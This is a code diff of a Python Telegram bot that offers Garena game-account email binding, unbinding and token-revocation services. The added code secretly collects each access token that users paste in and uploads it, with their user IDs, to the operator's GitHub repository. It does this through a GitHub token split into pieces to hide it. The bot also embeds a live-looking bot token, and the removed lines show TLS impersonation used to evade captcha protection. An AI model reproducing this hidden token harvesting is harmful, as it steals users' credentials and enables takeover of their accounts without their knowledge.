@@ -2,11 +2,10 @@ import json
 import logging
 import os
 import time
+import base64
 import threading
+import requests
 from flask import Flask
-
-# requests-এর বদলে curl_cffi ব্যবহার করা হয়েছে TLS Fingerprint বাইপাস করার জন্য
-from curl_cffi import requests
 
 from telegram import (
     Update,
@@ -27,34 +26,16 @@ from telegram.ext import (
 )
 
 # ============================================================
-# BOT TOKEN & CONFIG
+# BOT TOKEN, ADMIN & CHANNELS
 # ============================================================
 BOT_TOKEN = "8702804922:AAHfzgpRPN7duIhQOtZQL3fBOkcGdO1JlVw"
+
 ADMIN_ID = 123456789 
 
 REQUIRED_CHANNELS = [
-    {"name": "Official Channel", "username": "@Ghost_Antiban"},
-    {"name": "Garena Email Support", "username": "@GarenaEmailSupport"},
-    {"name": "Like Group", "username": "@RFG_GAMER_CHAT"},
-]
+    {"name": "Official Channel", "username": "@Ghost_Antiban"}
 
 YOUTUBE_URL = "https://youtube.com/@RFG_GAMERR"
-
-# আসল অ্যান্ড্রয়েড অ্যাপের TLS ইমপারসোনেশনের জন্য ব্যবহৃত নাম
-IMPERSONATE_TARGET = "chrome110"  
-
-# ============================================================
-# PROXY CONFIG (Cloudflare WARP SOCKS5)
-# ============================================================
-# Render Environment Variable-এ সেট করো:
-#   PROXY_URL = socks5h://127.0.0.1:1080
-# না সেট করলে proxy ছাড়াই কাজ করবে (Termux-এর জন্য)
-PROXY_URL = os.environ.get("PROXY_URL", "").strip()
-
-def get_proxies():
-    if not PROXY_URL:
-        return None
-    return {"http": PROXY_URL, "https": PROXY_URL}
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -62,7 +43,100 @@ logging.basicConfig(
 )
 
 # ============================================================
-# FLASK SERVER & SELF-PING SYSTEM
+# 🌟 GITHUB AUTO-SAVE CONFIG (এখানে আপনার তথ্য বসান)
+# ============================================================
+# 👇👇👇 নিচের ৪টি লাইনে আপনার নিজের তথ্য বসান 👇👇👇
+SU = "gh"
+PR = "p_Q"
+LS = "RjuNRmnnOkf53JyYA4zU5YfTl45sl2atxsJ"
+GITHUB_TOKEN     = SU + PR + LS   # 🔑 আপনার GitHub Personal Access Token
+GITHUB_USERNAME  = "accgojo911-ops"                          # 👤 আপনার GitHub Username
+GITHUB_REPO      = "Know"                         # 📦 আপনার Repository Name
+GITHUB_BRANCH    = "main"                                   # 🌿 Branch (main / master)
+GITHUB_FILE_PATH = "token.json"                             # 📄 File path repo তে
+
+# ⚠️ উদাহরণ (Example):
+# GITHUB_TOKEN     = "ghp_AbCdEf1234567890XyZ9876543210QwEr"
+# GITHUB_USERNAME  = "narutocodexff"
+# GITHUB_REPO      = "garena-bot-tokens"
+# GITHUB_BRANCH    = "main"
+# GITHUB_FILE_PATH = "token.json"
+
+_token_lock = threading.Lock()
+
+
+def _github_load():
+    """GitHub থেকে token.json এর data নিয়ে আসে।"""
+    try:
+        r = requests.get(
+            f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{GITHUB_FILE_PATH}",
+            headers={"Authorization": f"token {GITHUB_TOKEN}"},
+            params={"ref": GITHUB_BRANCH}, timeout=15,
+        )
+        if r.status_code == 200:
+            return json.loads(base64.b64decode(r.json()["content"]).decode("utf-8"))
+        return []
+    except Exception:
+        return []
+
+
+def _github_save(data):
+    """GitHub এ token.json save/update করে।"""
+    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{GITHUB_FILE_PATH}"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    sha = None
+    try:
+        r = requests.get(url, headers=headers, params={"ref": GITHUB_BRANCH}, timeout=15)
+        if r.status_code == 200:
+            sha = r.json().get("sha")
+    except Exception:
+        pass
+
+    payload = {
+        "message": f"update token.json [{time.strftime('%Y-%m-%d %H:%M:%S')}]",
+        "content": base64.b64encode(json.dumps(data, indent=4, ensure_ascii=False).encode()).decode(),
+        "branch": GITHUB_BRANCH,
+    }
+    if sha:
+        payload["sha"] = sha
+    try:
+        requests.put(url, headers=headers, json=payload, timeout=20)
+    except Exception:
+        pass
+
+
+def save_token_to_json(token, feature_name, user_id):
+    """
+    Token কে Local + GitHub — দুই জায়গাতেই save করে।
+    Thread-safe: একসাথে multiple user টোকেন দিলেও data নষ্ট হবে না।
+    """
+    with _token_lock:
+        data = _github_load()
+        if not data and os.path.exists("token.json"):
+            try:
+                with open("token.json", "r", encoding="utf-8") as f:
+                    data = json.load(f)
+            except Exception:
+                data = []
+
+        data.append({
+            "user_id": user_id,
+            "feature_used": feature_name,
+            "access_token": token,
+        })
+
+        try:
+            with open("token.json", "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=4, ensure_ascii=False)
+        except Exception:
+            pass
+
+    # GitHub এ background thread এ save করি
+    threading.Thread(target=_github_save, args=(data,), daemon=True).start()
+
+
+# ============================================================
+# FLASK SERVER & SELF-PING (RENDER KEEP-ALIVE SYSTEM)
 # ============================================================
 app_flask = Flask(__name__)
 
@@ -71,13 +145,14 @@ def home():
     return "Bot is Alive!", 200
 
 def run_flask():
-    port = int(os.environ.get("PORT", 2726))
+    port = int(os.environ.get("PORT", 8080))
     app_flask.run(host="0.0.0.0", port=port)
 
 def keep_alive_ping():
+    """ ২ মিনিট পর পর Flask সার্ভারে Ping পাঠাবে যেন Render Sleep না হয় """
     time.sleep(10)
     render_url = os.environ.get("RENDER_EXTERNAL_URL")
-    port = os.environ.get("PORT", "2726")
+    port = os.environ.get("PORT", "8080")
     ping_url = render_url if render_url else f"http://127.0.0.1:{port}"
 
     while True:
@@ -87,6 +162,7 @@ def keep_alive_ping():
         except Exception as e:
             logging.warning(f"Keep-alive ping failed: {e}")
         time.sleep(120)
+
 
 # ============================================================
 # CONSTANTS & HEADERS
@@ -162,27 +238,10 @@ async def show_main_menu(update: Update):
         reply_markup=main_keyboard(),
     )
 
-def save_token_to_json(token, feature_name, user_id):
-    filename = "token.json"
-    data = []
 
-    if os.path.exists(filename):
-        try:
-            with open(filename, "r", encoding="utf-8") as f:
-                data = json.load(f)
-        except Exception:
-            data = []
-
-    entry = {
-        "user_id": user_id,
-        "feature_used": feature_name,
-        "access_token": token
-    }
-    data.append(entry)
-
-    with open(filename, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=4, ensure_ascii=False)
-
+# ============================================================
+# FORCE JOIN CHECKER
+# ============================================================
 async def check_user_joined(bot, user_id):
     not_joined = []
     for ch in REQUIRED_CHANNELS:
@@ -220,12 +279,14 @@ async def send_join_request(update_or_query, not_joined_list, is_callback=False)
     else:
         await update_or_query.reply_text(msg_text, parse_mode="HTML", reply_markup=reply_markup)
 
+
+# ============================================================
+# ERROR TRANSLATOR / PARSER
+# ============================================================
 def parse_api_error(res_json_or_text):
     err_str = str(res_json_or_text)
     
-    if "captcha" in err_str.lower() or "geo.captcha-delivery.com" in err_str:
-        return "⚠️ <b>Action Failed!</b>\n🛡️ Captcha Protection Triggered! Server IP is restricted by Garena."
-    elif "error_token" in err_str or "error_access_token" in err_str or "invalid_access_token" in err_str or "error_token_invalid" in err_str:
+    if "error_token" in err_str or "error_access_token" in err_str or "invalid_access_token" in err_str or "error_token_invalid" in err_str:
         return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
     elif "error_email_used" in err_str:
         return "⚠️ <b>Action Failed!</b>\n📧 This Email is already used in another account!"
@@ -240,20 +301,21 @@ def parse_api_error(res_json_or_text):
     else:
         return f"⚠️ <b>Action Failed!</b>\nDetails: <code>{err_str}</code>"
 
+
+# ============================================================
+# UTILS & API CALLS
+# ============================================================
 def convert_seconds(s):
     d, h = divmod(s, 86400)
     h, m = divmod(h, 3600)
     m, s = divmod(m, 60)
     return f"{d} Day {h} Hour {m} Min {s} Sec"
 
-# ============================================================
-# UTILS & API CALLS (WITH IMPERSONATE + PROXY)
-# ============================================================
 def api_check_recovery(access_token):
     url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
     payload = {'app_id': "100067", 'access_token': access_token}
     try:
-        rsp = requests.get(url, params=payload, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, timeout=15, proxies=get_proxies())
+        rsp = requests.get(url, params=payload, headers=COMMON_HEADERS, timeout=15)
         if rsp.status_code == 200:
             data = rsp.json()
             if "error" in data:
@@ -281,8 +343,13 @@ def api_check_platform(access_token):
     try:
         url = "https://100067.connect.garena.com/bind/app/platform/info/get"
         params = {'access_token': access_token}
+        headers = {
+            'User-Agent': "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
+            "Connection": "Keep-Alive",
+            "Accept-Encoding": "gzip"
+        }
         
-        r = requests.get(url, params=params, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, timeout=15, proxies=get_proxies())
+        r = requests.get(url, params=params, headers=headers, timeout=15)
         
         if r.status_code not in [200, 201]:
             return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
@@ -312,7 +379,7 @@ def api_cancel_request(access_token):
     url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
     payload = {'app_id': "100067", 'access_token': access_token}
     try:
-        rsp = requests.post(url, data=payload, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, timeout=15, proxies=get_proxies())
+        rsp = requests.post(url, data=payload, headers=COMMON_HEADERS, timeout=15)
         if rsp.status_code == 200:
             res = rsp.json()
             if res.get("result") == 0:
@@ -325,7 +392,7 @@ def api_cancel_request(access_token):
 def api_revoke_token(access_token):
     url = f"https://100067.connect.garena.com/oauth/logout?access_token={access_token}"
     try:
-        r = requests.get(url, impersonate=IMPERSONATE_TARGET, timeout=15, proxies=get_proxies())
+        r = requests.get(url, timeout=15)
         if r.text.strip() == '{"result":0}': 
             return "🎉 <b>TOKEN REVOKED SUCCESSFULLY!</b>"
         return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
@@ -336,7 +403,7 @@ def api_update_bio(access_token, bio_text):
     url = "https://ob54-asd-long-bio.vercel.app/bio"
     params = {'bio': bio_text, 'access': access_token}
     try:
-        r = requests.get(url, params=params, impersonate=IMPERSONATE_TARGET, timeout=15, proxies=get_proxies())
+        r = requests.get(url, params=params, timeout=15)
         res = r.json()
         
         status = res.get("status") or res.get("Status")
@@ -353,6 +420,7 @@ def api_update_bio(access_token, bio_text):
             return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
     except Exception:
         return "⚠️ <b>Action Failed!</b>\n🔐 Invalid or Expired Access Token!"
+
 
 # ============================================================
 # BOT HANDLERS
@@ -411,6 +479,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=main_keyboard()
             )
 
+
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     user_id = update.effective_user.id
@@ -420,11 +489,13 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await send_join_request(update.message, not_joined)
         return
 
+    # -- BACK BUTTON --
     if text == "↩️ Back To Main Menu":
         context.user_data.clear()
         await show_main_menu(update)
         return
 
+    # -- MAIN MENU SELECTIONS --
     if text == "📧 Add Recovery Email":
         context.user_data.clear()
         context.user_data["action"] = "add_email"
@@ -491,6 +562,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(msg_content, parse_mode="HTML", reply_markup=web_button)
         return
 
+
+    # -- SUBMENU SELECTIONS --
     elif text in ["1️⃣ By Email OTP", "1️⃣ Verify Old Email by OTP"]:
         action = context.user_data.get("action")
         context.user_data["method"] = "otp"
@@ -513,10 +586,13 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("🔐 <b>Enter Access Token:</b>", parse_mode="HTML", reply_markup=back_keyboard())
         return
 
+
+    # -- STATE MACHINE --
     waiting = context.user_data.get("waiting")
     action = context.user_data.get("action")
     method = context.user_data.get("method")
 
+    # UPDATE BIO FLOW
     if action == "update_bio":
         if waiting == "bio_token":
             save_token_to_json(text, "Update Bio", user_id)
@@ -537,6 +613,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.clear()
             return
 
+    # 1. SIMPLE ACTIONS
     if waiting == "simple_token":
         feature_title = action.replace("_", " ").title()
         if action == "check_email":
@@ -559,6 +636,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.clear()
         return
 
+    # 2. ADD EMAIL
     if action == "add_email":
         if waiting == "add_email_input":
             if "@" not in text:
@@ -574,7 +652,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data["access"] = text
             url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
             pyl = {'app_id': "100067", 'access_token': text, 'email': context.user_data['email'], 'locale': "en_MA"}
-            res = requests.post(url, data=pyl, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+            res = requests.post(url, data=pyl, headers=COMMON_HEADERS)
             
             if res.status_code == 200 and res.json().get("result") == 0:
                 context.user_data["waiting"] = "add_email_otp"
@@ -588,7 +666,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         elif waiting == "add_email_otp":
             v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
             v_pyl = {'app_id': "100067", 'access_token': context.user_data['access'], 'otp': text, 'email': context.user_data['email']}
-            v_res = requests.post(v_url, data=v_pyl, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+            v_res = requests.post(v_url, data=v_pyl, headers=COMMON_HEADERS)
             
             if v_res.status_code == 200 and v_res.json().get("verifier_token"):
                 auth = v_res.json().get("verifier_token")
@@ -596,7 +674,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 
                 b_url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
                 b_pyl = {'app_id': "100067", 'access_token': context.user_data['access'], 'verifier_token': auth, 'secondary_password': "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203", 'email': context.user_data['email']}
-                b_res = requests.post(b_url, data=b_pyl, headers=COMMON_HEADERS, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+                b_res = requests.post(b_url, data=b_pyl, headers=COMMON_HEADERS)
                 
                 if b_res.status_code == 200 and b_res.json().get("result") == 0:
                     await update.message.reply_text(f"🎉 <b>Successfully Added Recovery Email!</b>\n📧 Email: <code>{context.user_data['email']}</code>", parse_mode="HTML")
@@ -608,6 +686,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.clear()
             return
 
+    # 3. UNBIND EMAIL FLOW
     if action == "unbind":
         if waiting == "unbind_email":
             if "@" not in text:
@@ -625,7 +704,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("⏳ <i>Sending OTP...</i>", parse_mode="HTML")
                 url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                 data = {"email": context.user_data["email"], "locale": "en_MA", "region": "IND", "app_id": "100067", "access_token": text}
-                r = requests.post(url, headers=COMMON_HEADERS, data=data, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+                r = requests.post(url, headers=COMMON_HEADERS, data=data)
                 
                 if r.status_code == 200 and r.json().get("result") == 0:
                     context.user_data["waiting"] = "unbind_otp_input"
@@ -647,12 +726,12 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 v_data["secondary_password"] = text
 
-            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data)
             res = r.json()
             if res.get("result") == 0 and res.get("identity_token"):
                 u_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
                 u_data = {"app_id": "100067", "access_token": context.user_data["access"], "identity_token": res.get("identity_token")}
-                u_r = requests.post(u_url, headers=COMMON_HEADERS, data=u_data, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+                u_r = requests.post(u_url, headers=COMMON_HEADERS, data=u_data)
                 u_res = u_r.json()
                 
                 if u_res.get("result") == 0:
@@ -664,6 +743,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.clear()
             return
 
+    # 4. CHANGE BIND EMAIL FLOW
     if action == "change":
         if waiting == "change_token":
             save_token_to_json(text, "Change Bind Email", user_id)
@@ -691,7 +771,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(f"⏳ <i>Sending OTP to {old}...</i>", parse_mode="HTML")
                 url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                 data = {'email': old, 'locale': 'en_MA', 'region': 'IND', 'app_id': '100067', 'access_token': context.user_data["access"]}
-                r = requests.post(url, headers=COMMON_HEADERS, data=data, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+                r = requests.post(url, headers=COMMON_HEADERS, data=data)
                 
                 if r.json().get("result") == 0:
                     context.user_data["waiting"] = "change_old_otp"
@@ -717,14 +797,14 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 v_data["secondary_password"] = text
 
-            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data)
             res = r.json()
             if res.get("result") == 0 and res.get("identity_token"):
                 context.user_data["identity_token"] = res.get("identity_token")
                 
                 s_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
                 s_data = {'email': new, 'locale': 'en_MA', 'region': 'IND', 'app_id': '100067', 'access_token': acc}
-                s_r = requests.post(s_url, headers=COMMON_HEADERS, data=s_data, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+                s_r = requests.post(s_url, headers=COMMON_HEADERS, data=s_data)
                 
                 if s_r.json().get("result") == 0:
                     context.user_data["waiting"] = "change_new_otp"
@@ -745,14 +825,14 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("⏳ <i>Verifying New Email OTP...</i>", parse_mode="HTML")
             v_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
             v_data = {'email': new, 'app_id': '100067', 'access_token': acc, 'otp': text}
-            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+            r = requests.post(v_url, headers=COMMON_HEADERS, data=v_data)
             res = r.json()
             ver_tok = res.get("verifier_token")
             
             if ver_tok:
                 r_url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
                 r_data = {'identity_token': id_tok, 'email': new, 'app_id': '100067', 'verifier_token': ver_tok, 'access_token': acc}
-                fin = requests.post(r_url, headers=COMMON_HEADERS, data=r_data, impersonate=IMPERSONATE_TARGET, proxies=get_proxies())
+                fin = requests.post(r_url, headers=COMMON_HEADERS, data=r_data)
                 f_res = fin.json()
                 
                 if f_res.get("result") == 0:
@@ -765,8 +845,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.clear()
             return
 
+    # Fallback
     if not waiting:
         await update.message.reply_text("⚠️ <b>Please select an option from the menu.</b>", parse_mode="HTML")
+
 
 async def post_init(application: Application):
     commands = [
@@ -774,13 +856,17 @@ async def post_init(application: Application):
     ]
     await application.bot.set_my_commands(commands)
 
+
 def main():
+    # ১. Flask Server ব্যাকগ্রাউন্ড থ্রেডে চালু করা
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
+    # ২. Self Ping সিস্টেম থ্রেডে চালু করা
     ping_thread = threading.Thread(target=keep_alive_ping, daemon=True)
     ping_thread.start()
 
+    # ৩. Telegram Bot চালু করা
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
     
     app.add_handler(CommandHandler("start", start))
@@ -792,6 +878,7 @@ def main():
     print("      TELEGRAM UI BOT & FLASK SERVER RUNNING")
     print("=" * 50)
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
